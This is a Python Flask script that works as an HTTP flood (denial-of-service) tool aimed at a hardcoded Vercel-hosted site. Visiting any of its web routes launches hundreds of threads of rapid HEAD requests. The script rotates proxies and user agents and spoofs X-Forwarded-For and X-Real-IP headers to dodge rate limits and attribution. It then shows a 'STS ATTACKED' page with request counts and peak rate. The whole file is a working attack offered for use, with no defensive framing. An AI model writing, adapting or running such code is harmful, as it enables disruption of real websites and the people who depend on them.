from flask import Flask, Response
import requests
import threading
import random
import time

app = Flask(__name__)

# Load UAs, Refs, Proxies
def load_lines(file):
    try:
        with open(file, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

user_agents = load_lines("ua.txt") or ["Mozilla/5.0"]
referers = load_lines("refs.txt") or ["https://google.com"]
proxies_list = load_lines("proxy.txt") or []

target = "https://sts-base.vercel.app/"

def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def generate_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(referers),
        "X-Forwarded-For": random_ip(),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "DNT": "1",
        "X-Real-IP": random_ip(),
        "X-Forwarded-Proto": "https",
        "Pragma": "no-cache"
    }

def pick_proxy():
    proxy = random.choice(proxies_list) if proxies_list else None
    if proxy:
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    else:
        return None

def send_requests(time_limit, thread_count, use_proxies=False):
    attempted = 0
    success = 0
    failed = 0
    lock = threading.Lock()
    start_time = time.time()

    def send_loop(proxy=None):
        nonlocal attempted, success, failed
        count = 0
        while time.time() - start_time < time_limit:
            if proxy and count >= 12:
                break  # Max 12 requests per proxy
            headers = generate_headers()
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
            try:
                res = requests.head(target, headers=headers, proxies=proxies, timeout=2)
                with lock:
                    attempted += 1
                    if res.status_code < 500:
                        success += 1
                    else:
                        failed += 1
                count += 1
            except:
                with lock:
                    attempted += 1
                    failed += 1
                count += 1

    threads = []
    if use_proxies and proxies_list:
        for proxy in proxies_list:
            t = threading.Thread(target=send_loop, args=(proxy,))
            t.start()
            threads.append(t)
    else:
        for _ in range(thread_count):
            t = threading.Thread(target=send_loop)
            t.start()
            threads.append(t)

    for t in threads:
        t.join()

    return attempted, success, failed, round(time.time() - start_time, 2)

def generate_html(attempted, success, failed, duration):
    peak = round(attempted / duration, 2)
    return f"""
    <html>
    <head><title>STS POWER</title>
    <style>
        body {{
            background-color: #2a2a2a;
            color: white;
            font-family: monospace;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }}
        h1 {{
            font-size: 3em;
        }}
    </style>
    </head>
    <body>
        <h1>STS ATTACKED</h1>
        <p>Target: {target}</p>
        <p>Total Sent: {attempted}</p>
        <p>Success: {success}</p>
        <p>Failed: {failed}</p>
        <p>Peak RPS: {peak}</p>
        <p>Time: {duration} sec</p>
    </body>
    </html>
    """

# Routes
@app.route('/')
def main_fire():
    attempted, success, failed, duration = send_requests(250, 500, use_proxies=False)
    return Response(generate_html(attempted, success, failed, duration))

@app.route('/su')
def su_route():
    attempted, success, failed, duration = send_requests(10, 100, use_proxies=True)
    return Response(generate_html(attempted, success, failed, duration))

@app.route('/ru')
def ru_route():
    attempted, success, failed, duration = send_requests(10, 100, use_proxies=True)
    return Response(generate_html(attempted, success, failed, duration))

@app.route('/com')
def com_route():
    attempted, success, failed, duration = send_requests(10, 100, use_proxies=True)
    return Response(generate_html(attempted, success, failed, duration))

@app.route('/sts')
def sts_route():
    attempted, success, failed, duration = send_requests(10, 250, use_proxies=True)
    return Response(generate_html(attempted, success, failed, duration))

if __name__ == '__main__':
    app.run(debug=True)
              
